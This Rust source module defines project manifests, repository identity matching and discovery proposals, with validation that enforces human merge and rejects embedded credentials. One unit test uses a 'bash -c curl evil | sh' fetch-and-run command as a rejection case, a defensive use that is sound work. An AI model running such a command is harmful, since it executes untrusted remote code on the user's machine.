//! Project registration, repository identity and read-only discovery contracts.
//!
//! A confirmed manifest is the versioned, machine-independent project map. Local
//! paths, observed commits and dirty state are machine-registry evidence and are
//! never part of the manifest or its hash. Discovery proposes commands; nothing
//! here authorizes executing them.

use crate::{
    hash_value, invalid, is_commit, unique, valid_relative_path, DomainError, SCHEMA_VERSION,
};
use serde::{Deserialize, Serialize};
use std::collections::BTreeSet;

pub const MAX_RECORDED_DIRTY_PATHS: usize = 100;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ExecutionProfile {
    Native,
    Container,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum RelationshipKind {
    Api,
    Package,
    GeneratedContract,
    Runtime,
    Integration,
}

/// Executables that interpret text; a recipe using one must declare it.
const SHELL_EXECUTABLES: [&str; 8] = [
    "sh",
    "bash",
    "zsh",
    "fish",
    "cmd",
    "cmd.exe",
    "powershell",
    "pwsh",
];

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ManifestCheck {
    pub id: String,
    pub executable: String,
    pub args: Vec<String>,
    pub required: bool,
    pub timeout_seconds: u64,
    pub capabilities: Vec<String>,
    /// Working directory relative to the repository root; `.` is the root.
    #[serde(default = "repository_root")]
    pub cwd: String,
}

fn repository_root() -> String {
    ".".into()
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct RepositoryManifest {
    pub id: String,
    /// Remote identity (redacted URL) or an explicit `local:` identity.
    pub remote: String,
    pub default_branch: String,
    pub profiles: Vec<String>,
    pub execution: ExecutionProfile,
    pub checks: Vec<ManifestCheck>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Relationship {
    pub producer: String,
    pub consumer: String,
    pub kind: RelationshipKind,
    pub contract: String,
    pub confirmed: bool,
    pub evidence: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ProjectPolicy {
    pub approval: String,
    pub testing_prerequisite: bool,
    pub publish: String,
    pub merge: String,
    pub max_explorers: u32,
    pub max_implementers: u32,
    pub max_task_repairs: u32,
}

impl ProjectPolicy {
    /// The only v1 policy: plan approval, testing prerequisite, automatic PRs, human merge.
    pub fn v1(max_explorers: u32, max_implementers: u32, max_task_repairs: u32) -> Self {
        Self {
            approval: "plan".into(),
            testing_prerequisite: true,
            publish: "automatic_pr".into(),
            merge: "human".into(),
            max_explorers,
            max_implementers,
            max_task_repairs,
        }
    }
}

/// Mirrors `schemas/project.schema.json`. The hash covers every field.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ProjectManifest {
    pub schema_version: String,
    pub id: String,
    pub name: String,
    pub revision: u64,
    pub repositories: Vec<RepositoryManifest>,
    pub relationships: Vec<Relationship>,
    pub policy: ProjectPolicy,
}

impl ProjectManifest {
    pub fn computed_hash(&self) -> Result<String, DomainError> {
        hash_value(&serde_json::to_value(self)?)
    }

    pub fn repository_ids(&self) -> BTreeSet<&str> {
        self.repositories.iter().map(|r| r.id.as_str()).collect()
    }

    pub fn validate(&self) -> Result<(), DomainError> {
        if self.schema_version != SCHEMA_VERSION {
            return invalid("unsupported manifest schema version");
        }
        if !valid_project_id(&self.id) {
            return invalid("project ID must match ^[a-z][a-z0-9-]{0,63}$");
        }
        if self.name.trim().is_empty() || self.name.len() > 200 {
            return invalid("project name must be 1..200 bytes");
        }
        if self.revision == 0 {
            return invalid("manifest revision must be positive");
        }
        if self.repositories.is_empty() || self.repositories.len() > 32 {
            return invalid("a manifest lists between one and 32 repositories");
        }
        let mut ids = BTreeSet::new();
        for repository in &self.repositories {
            if !valid_project_id(&repository.id) || !ids.insert(repository.id.as_str()) {
                return invalid("repository IDs must be unique and match ^[a-z][a-z0-9-]*$");
            }
            if !valid_remote_identity(&repository.remote) {
                return invalid(
                    "repository remote identity must be a redacted URL or local: identity",
                );
            }
            if !valid_branch_name(&repository.default_branch) {
                return invalid("default branch is not a valid Git branch name");
            }
            if repository.profiles.is_empty()
                || repository.profiles.iter().any(|p| !valid_token(p))
                || !unique(&repository.profiles)
            {
                return invalid("profiles must be unique nonempty tokens");
            }
            if repository.checks.is_empty() || !repository.checks.iter().any(|c| c.required) {
                return invalid("each repository needs at least one required check recipe");
            }
            let mut check_ids = BTreeSet::new();
            for check in &repository.checks {
                if !valid_token(&check.id) || !check_ids.insert(check.id.as_str()) {
                    return invalid("check IDs must be unique nonempty tokens");
                }
                validate_check(check)?;
            }
        }
        for relationship in &self.relationships {
            if !ids.contains(relationship.producer.as_str())
                || !ids.contains(relationship.consumer.as_str())
                || relationship.producer == relationship.consumer
                || relationship.contract.trim().is_empty()
                || relationship.evidence.is_empty()
                || relationship.evidence.iter().any(|e| e.trim().is_empty())
            {
                return invalid(
                    "relationships must link two distinct known repositories with evidence",
                );
            }
        }
        let policy = &self.policy;
        if policy.approval != "plan"
            || !policy.testing_prerequisite
            || policy.publish != "automatic_pr"
            || policy.merge != "human"
            || policy.max_explorers == 0
            || policy.max_implementers == 0
        {
            return invalid("policy must require plan approval, testing prerequisite, automatic PRs and human merge");
        }
        Ok(())
    }
}

fn validate_check(check: &ManifestCheck) -> Result<(), DomainError> {
    let executable = &check.executable;
    if executable.is_empty()
        || executable.len() > 256
        || executable.bytes().any(|b| b < 32 || b == 127)
        || executable.starts_with('/')
        || executable.starts_with('\\')
        || executable.contains(':')
        || executable.split(['/', '\\']).any(|part| part == "..")
    {
        return invalid("check executable must be a command name or repository-relative path");
    }
    let base = executable
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(executable)
        .to_ascii_lowercase();
    let base = base.strip_suffix(".exe").unwrap_or(&base);
    if SHELL_EXECUTABLES.contains(&base) && !check.capabilities.iter().any(|c| c == "shell") {
        return invalid("a shell recipe must declare the shell capability explicitly");
    }
    if check.args.len() > 64
        || check
            .args
            .iter()
            .any(|a| a.len() > 1024 || a.bytes().any(|b| b < 32 || b == 127))
    {
        return invalid("check arguments must be short printable strings");
    }
    if check.timeout_seconds == 0 || check.timeout_seconds > 86_400 {
        return invalid("check timeout must be between 1 second and 24 hours");
    }
    if check.capabilities.iter().any(|c| !valid_token(c)) || !unique(&check.capabilities) {
        return invalid("capabilities must be unique nonempty tokens");
    }
    if !valid_relative_path(&check.cwd) && check.cwd != "." {
        return invalid("check cwd must be `.` or a relative path inside the repository");
    }
    Ok(())
}

pub fn valid_project_id(value: &str) -> bool {
    let bytes = value.as_bytes();
    !bytes.is_empty()
        && bytes.len() <= 64
        && bytes[0].is_ascii_lowercase()
        && bytes
            .iter()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || *b == b'-')
}

fn valid_token(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 64
        && value
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_' || b == b'.')
}

pub fn valid_remote_identity(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 512
        && !value.bytes().any(|b| b <= 32 || b == 127)
        && !value.contains('?')
        && !value.contains('#')
        && !remote_has_userinfo(value)
        && !is_filesystem_remote(value)
}

/// Filesystem origins are machine-specific and never belong in a portable manifest.
pub fn is_filesystem_remote(value: &str) -> bool {
    let bytes = value.as_bytes();
    value.starts_with('/')
        || value.starts_with('\\')
        || value.starts_with("./")
        || value.starts_with("../")
        || value.starts_with(".\\")
        || value.starts_with("..\\")
        || value.to_ascii_lowercase().starts_with("file:")
        || (bytes.len() >= 3
            && bytes[0].is_ascii_alphabetic()
            && bytes[1] == b':'
            && (bytes[2] == b'/' || bytes[2] == b'\\'))
        || !value.contains(':')
}

/// The comparison key of a remote identity. Spellings that name the same
/// repository agree: scp-like `user@host:/path` and `ssh://user@host/path` (also
/// `git+ssh`/`ssh+git`), `http` and `https`, any user name, a default port, host
/// case, and a trailing `/` or `.git`. A different transport family (HTTPS versus
/// SSH), host, port or path is a different remote; `local:` identities and other
/// forms compare exactly.
pub fn remote_identity_key(remote: &str) -> String {
    let (family, authority, path, absolute) = if let Some((scheme, rest)) = remote.split_once("://")
    {
        let family = match scheme.to_ascii_lowercase().as_str() {
            "ssh" | "git+ssh" | "ssh+git" => "ssh".to_owned(),
            "http" | "https" => "https".to_owned(),
            other => other.to_owned(),
        };
        let (authority, path) = rest.split_once('/').unwrap_or((rest, ""));
        (family, authority, path, true)
    } else {
        // scp-like syntax: a colon before any slash, and not a `local:` identity.
        match remote.split_once(':') {
            Some((authority, path))
                if !authority.is_empty()
                    && !authority.contains('/')
                    && !authority.eq_ignore_ascii_case("local") =>
            {
                ("ssh".to_owned(), authority, path, path.starts_with('/'))
            }
            _ => return remote.to_owned(),
        }
    };
    let host = authority.rsplit('@').next().unwrap_or(authority);
    let host = match host.rsplit_once(':') {
        Some((name, port))
            if !port.is_empty()
                && port.bytes().all(|b| b.is_ascii_digit())
                && matches!(
                    (family.as_str(), port),
                    ("ssh", "22") | ("https", "443" | "80") | ("git", "9418")
                ) =>
        {
            name
        }
        _ => host,
    };
    let mut path = path.trim_start_matches('/').trim_end_matches('/');
    if let Some(stripped) = path.strip_suffix(".git") {
        path = stripped.trim_end_matches('/');
    }
    if family == "ssh" {
        let scope = if absolute { "absolute" } else { "relative" };
        format!("{family}://{}/{scope}/{path}", host.to_ascii_lowercase())
    } else {
        format!("{family}://{}/{path}", host.to_ascii_lowercase())
    }
}

/// Whether two remote identities name the same repository; see [`remote_identity_key`].
pub fn remotes_equivalent(left: &str, right: &str) -> bool {
    left == right || remote_identity_key(left) == remote_identity_key(right)
}

/// How an identity mismatch is resolved. The runtime substitutes the IDs.
pub const IDENTITY_RECOVERY: &str = "restore the registered checkout, or, if the change is intended, rebind the repository with POST /api/v1/projects/{id}/repositories/{repository_id}/rebind";

/// `scheme://user:secret@host` must never be recorded; redact before use.
fn remote_has_userinfo(value: &str) -> bool {
    value
        .split_once("://")
        .map(|(_, rest)| rest.split('/').next().unwrap_or("").contains('@'))
        .unwrap_or(false)
}

pub fn valid_branch_name(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 255
        && !value.starts_with('-')
        && !value.starts_with('/')
        && !value.ends_with('/')
        && !value.ends_with('.')
        && !value.ends_with(".lock")
        && !value.contains("..")
        && !value.contains("//")
        && !value.contains("@{")
        && value != "@"
        && !value
            .bytes()
            .any(|b| b <= 32 || b == 127 || b":?*[\\~^".contains(&b))
}

/// Facts that identify the same repository across hosts and time.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct RepositoryIdentity {
    /// Redacted `origin` fetch URL, if a portable one is configured.
    pub remote: Option<String>,
    /// Redacted `origin` push URL when it differs from the fetch URL.
    #[serde(default)]
    pub push_remote: Option<String>,
    /// Sorted parentless commits; empty for shallow clones. A registration records
    /// those reachable from HEAD. A fresh observation compared with it records
    /// those reachable from HEAD or any local branch, which must contain them.
    pub root_commits: Vec<String>,
    pub shallow: bool,
}

impl RepositoryIdentity {
    pub fn validate(&self) -> Result<(), DomainError> {
        if self
            .remote
            .as_deref()
            .is_some_and(|r| !valid_remote_identity(r))
            || self
                .push_remote
                .as_deref()
                .is_some_and(|r| !valid_remote_identity(r))
        {
            return invalid(
                "remote identity contains credentials, a filesystem path or invalid characters",
            );
        }
        if self.root_commits.iter().any(|c| !is_commit(c)) || !unique(&self.root_commits) {
            return invalid("root commits must be unique full commit identities");
        }
        if !self.shallow && self.root_commits.is_empty() {
            return invalid("a complete clone must report at least one root commit");
        }
        if self.shallow && self.remote.is_none() {
            return invalid("a shallow clone without a remote has no stable identity");
        }
        Ok(())
    }

    /// Registration binds to these facts; a different repository at the same
    /// path, or a changed remote, is never silently accepted. The developer
    /// either restores the registered checkout or rebinds the repository
    /// explicitly. Equivalent remote spellings ([`remotes_equivalent`]) and roots
    /// added to the history (an unrelated-history merge, a checked-out orphan
    /// branch) are the same repository: every registered root must still be
    /// observed, and an observation may add roots.
    pub fn matches(&self, observed: &Self) -> Result<(), DomainError> {
        self.validate()?;
        observed.validate()?;
        let mismatch = |detail: String| {
            DomainError::IdentityMismatch(format!("{detail}; {IDENTITY_RECOVERY}"))
        };
        if let (Some(expected), Some(actual)) = (&self.remote, &observed.remote) {
            if !remotes_equivalent(expected, actual) {
                return Err(mismatch(format!(
                    "remote changed from {expected} to {actual}"
                )));
            }
        }
        if !self.shallow
            && !observed.shallow
            && !self
                .root_commits
                .iter()
                .all(|root| observed.root_commits.contains(root))
        {
            return Err(mismatch(
                "a registered root commit is not reachable from HEAD or any local branch; this is a different repository or rewritten history".into(),
            ));
        }
        if (self.shallow || observed.shallow)
            && (self.remote.is_none() || observed.remote.is_none())
        {
            return Err(mismatch(
                "shallow clone identity requires a matching remote".into(),
            ));
        }
        if self.remote.is_some() != observed.remote.is_some() {
            return Err(mismatch(
                "the origin remote was added or removed since registration".into(),
            ));
        }
        let push_matches = match (&self.push_remote, &observed.push_remote) {
            (Some(expected), Some(actual)) => remotes_equivalent(expected, actual),
            (expected, actual) => expected == actual,
        };
        if !push_matches {
            return Err(mismatch("the origin push URL changed".into()));
        }
        Ok(())
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct DirtyState {
    pub staged: u64,
    pub unstaged: u64,
    pub untracked: u64,
    pub conflicted: u64,
    /// Up to `MAX_RECORDED_DIRTY_PATHS` affected paths, for display only.
    pub paths: Vec<String>,
    pub truncated: bool,
}

impl DirtyState {
    pub fn is_clean(&self) -> bool {
        self.staged == 0 && self.unstaged == 0 && self.untracked == 0 && self.conflicted == 0
    }
}

/// Read-only facts observed on one machine at one moment. Never hashed into a manifest.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct RepositoryObservation {
    pub local_path: String,
    pub identity: RepositoryIdentity,
    pub head_commit: String,
    /// Current branch; `None` when HEAD is detached.
    pub branch: Option<String>,
    /// Branch named by `refs/remotes/origin/HEAD`, when configured.
    pub remote_default_branch: Option<String>,
    pub local_branches: Vec<String>,
    pub dirty: DirtyState,
    pub git_version: String,
    pub observed_at: String,
}

impl RepositoryObservation {
    pub fn validate(&self) -> Result<(), DomainError> {
        self.identity.validate()?;
        if self.local_path.is_empty() || !is_commit(&self.head_commit) {
            return invalid("observation requires a local path and exact HEAD commit");
        }
        if self
            .branch
            .as_deref()
            .is_some_and(|b| !valid_branch_name(b))
            || self
                .remote_default_branch
                .as_deref()
                .is_some_and(|b| !valid_branch_name(b))
        {
            return invalid("observed branch names are invalid");
        }
        Ok(())
    }

    /// The current branch, origin's HEAD or a local branch. Confirmation also
    /// accepts an `origin/<name>` remote-tracking branch observed separately.
    pub fn has_branch(&self, name: &str) -> bool {
        self.branch.as_deref() == Some(name)
            || self.remote_default_branch.as_deref() == Some(name)
            || self.local_branches.iter().any(|b| b == name)
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Confidence {
    /// Read directly from a manifest or lockfile the repository declares.
    Observed,
    /// A conventional command for the detected stack; confirm before relying on it.
    Inferred,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ProposedCheck {
    pub check: ManifestCheck,
    pub evidence: Vec<String>,
    pub confidence: Confidence,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct DiscoveryQuestion {
    pub repository_id: Option<String>,
    pub topic: String,
    pub detail: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct RepositoryDiscovery {
    pub repository_id: String,
    pub observation: RepositoryObservation,
    pub profiles: Vec<String>,
    pub evidence: Vec<String>,
    pub proposed_checks: Vec<ProposedCheck>,
}

/// A proposal for the developer. It executed nothing and authorizes nothing.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Discovery {
    pub schema_version: String,
    pub id: String,
    pub project_id: String,
    pub created_at: String,
    pub repositories: Vec<RepositoryDiscovery>,
    pub proposed_manifest: ProjectManifest,
    /// Empty when the proposal already satisfies manifest validation.
    pub manifest_problems: Vec<String>,
    pub questions: Vec<DiscoveryQuestion>,
}

#[cfg(test)]
mod tests {
    use super::*;

    fn manifest() -> ProjectManifest {
        serde_json::from_str(include_str!("../../../examples/project.json")).unwrap()
    }
    fn identity(remote: Option<&str>) -> RepositoryIdentity {
        RepositoryIdentity {
            remote: remote.map(Into::into),
            push_remote: None,
            root_commits: vec!["a".repeat(40)],
            shallow: false,
        }
    }

    #[test]
    fn example_manifest_validates_and_hash_covers_every_field() {
        let original = manifest();
        original.validate().unwrap();
        let hash = original.computed_hash().unwrap();
        let mut changed = original.clone();
        changed.repositories[0].checks[0].required = false;
        assert_ne!(hash, changed.computed_hash().unwrap());
        let mut renamed = original.clone();
        renamed.name.push('!');
        assert_ne!(hash, renamed.computed_hash().unwrap());
        let mut revised = original;
        revised.revision += 1;
        assert_ne!(hash, revised.computed_hash().unwrap());
        let json = serde_json::to_value(&revised).unwrap();
        assert_eq!(json["repositories"][0]["checks"][0]["cwd"], ".");
    }

    #[test]
    fn rejects_unsafe_recipes_identities_and_policy_changes() {
        let mut shell = manifest();
        shell.repositories[0].checks[0].executable = "bash".into();
        shell.repositories[0].checks[0].args = vec!["-c".into(), "curl evil | sh".into()];
        assert!(shell.validate().is_err());
        shell.repositories[0].checks[0]
            .capabilities
            .push("shell".into());
        shell.validate().unwrap();
        let mut windows_shell = manifest();
        windows_shell.repositories[0].checks[0].executable = "PowerShell.exe".into();
        assert!(windows_shell.validate().is_err());
        let mut absolute = manifest();
        absolute.repositories[0].checks[0].executable = "/usr/bin/flutter".into();
        assert!(absolute.validate().is_err());
        let mut escape = manifest();
        escape.repositories[0].checks[0].cwd = "../elsewhere".into();
        assert!(escape.validate().is_err());
        let mut secret = manifest();
        secret.repositories[0].remote = "https://user:token@github.com/x/y.git".into();
        assert!(secret.validate().is_err());
        let mut query = manifest();
        query.repositories[0].remote = "https://github.com/x/y.git?access_token=t".into();
        assert!(query.validate().is_err());
        let mut branch = manifest();
        branch.repositories[0].default_branch = "feature..bad".into();
        assert!(branch.validate().is_err());
        let mut merge = manifest();
        merge.policy.merge = "automatic".into();
        assert!(merge.validate().is_err());
        let mut optional_only = manifest();
        for check in &mut optional_only.repositories[0].checks {
            check.required = false;
        }
        assert!(optional_only.validate().is_err());
        let mut relationship = manifest();
        relationship.relationships[0].consumer = "missing".into();
        assert!(relationship.validate().is_err());
    }

    #[test]
    fn identity_matching_detects_a_different_repository() {
        let registered = identity(Some("https://example.invalid/app.git"));
        registered.matches(&registered).unwrap();
        let mut other = registered.clone();
        other.root_commits = vec!["b".repeat(40)];
        assert!(matches!(
            registered.matches(&other),
            Err(DomainError::IdentityMismatch(_))
        ));
        let mut moved = registered.clone();
        moved.remote = Some("https://example.invalid/fork.git".into());
        assert!(registered.matches(&moved).is_err());
        let shallow = RepositoryIdentity {
            remote: Some("https://example.invalid/app.git".into()),
            push_remote: None,
            root_commits: vec![],
            shallow: true,
        };
        registered.matches(&shallow).unwrap();
        let unstable = RepositoryIdentity {
            remote: None,
            push_remote: None,
            root_commits: vec![],
            shallow: true,
        };
        assert!(unstable.validate().is_err());
        let local = identity(None);
        local.matches(&local).unwrap();
        assert!(local.matches(&registered).is_err());
        let leaked = identity(Some("ssh://git:pass@host/repo"));
        assert!(leaked.validate().is_err());
        for path_like in [
            "/srv/git/app.git",
            "../app.git",
            "file:///srv/app",
            "C:\\git\\app",
            "app.git",
        ] {
            assert!(is_filesystem_remote(path_like), "{path_like}");
            assert!(identity(Some(path_like)).validate().is_err(), "{path_like}");
        }
        for portable in [
            "https://github.com/x/y.git",
            "git@github.com:x/y.git",
            "local:app",
        ] {
            assert!(!is_filesystem_remote(portable), "{portable}");
        }
        let mut pushed = registered.clone();
        pushed.push_remote = Some("https://example.invalid/fork.git".into());
        assert!(registered.matches(&pushed).is_err());
        pushed.matches(&pushed).unwrap();
    }

    #[test]
    fn added_roots_and_equivalent_remote_spellings_are_the_same_repository() {
        let registered = identity(Some("git@Example.invalid:org/app.git"));
        // An unrelated-history merge or a checked-out orphan branch adds roots.
        let mut grown = registered.clone();
        grown.root_commits = vec!["a".repeat(40), "b".repeat(40)];
        registered.matches(&grown).unwrap();
        // A registered root that is no longer reachable is a different repository.
        assert!(grown.matches(&registered).is_err());
        let mut disjoint = registered.clone();
        disjoint.root_commits = vec!["b".repeat(40)];
        let error = registered.matches(&disjoint).unwrap_err().to_string();
        assert!(error.contains("different repository"), "{error}");
        assert!(
            error.contains("/repositories/{repository_id}/rebind")
                && !error.contains("re-register"),
            "{error}"
        );
        // Stored scheme URLs are already redacted of user information.
        for equivalent in [
            "git@example.invalid:org/app.git",
            "example.invalid:org/app",
            "deploy@EXAMPLE.invalid:org/app.git/",
            "deploy@example.invalid:org/app",
        ] {
            let observed = identity(Some(equivalent));
            registered.matches(&observed).unwrap();
            observed.matches(&registered).unwrap();
        }
        for different in [
            "https://example.invalid/org/app.git",
            "git@example.invalid:org/other.git",
            "ssh://example.invalid:2222/org/app.git",
            "git@example.org:org/app.git",
        ] {
            let error = registered
                .matches(&identity(Some(different)))
                .unwrap_err()
                .to_string();
            assert!(error.contains("remote changed"), "{different}: {error}");
        }
        assert!(remotes_equivalent(
            "http://example.invalid/org/app",
            "https://example.invalid:443/org/app.git"
        ));
        assert!(!remotes_equivalent(
            "git@host:org/app.git",
            "git@host:/org/app.git"
        ));
        assert!(!remotes_equivalent(
            "git@host:org/app.git",
            "ssh://host/org/app.git"
        ));
        assert!(remotes_equivalent(
            "git@host:/org/app.git",
            "ssh://host/org/app.git"
        ));
        assert!(!remotes_equivalent(
            "git@host:org/app.git",
            "ssh://host/~/org/app.git"
        ));
        assert!(!remotes_equivalent("local:app", "local:api"));
        assert_eq!(remote_identity_key("local:app"), "local:app");
        let mut pushed = identity(Some("https://example.invalid/org/app.git"));
        pushed.push_remote = Some("git@example.invalid:org/app-push.git".into());
        let mut respelled = pushed.clone();
        respelled.push_remote = Some("deploy@example.invalid:org/app-push".into());
        pushed.matches(&respelled).unwrap();
    }
}
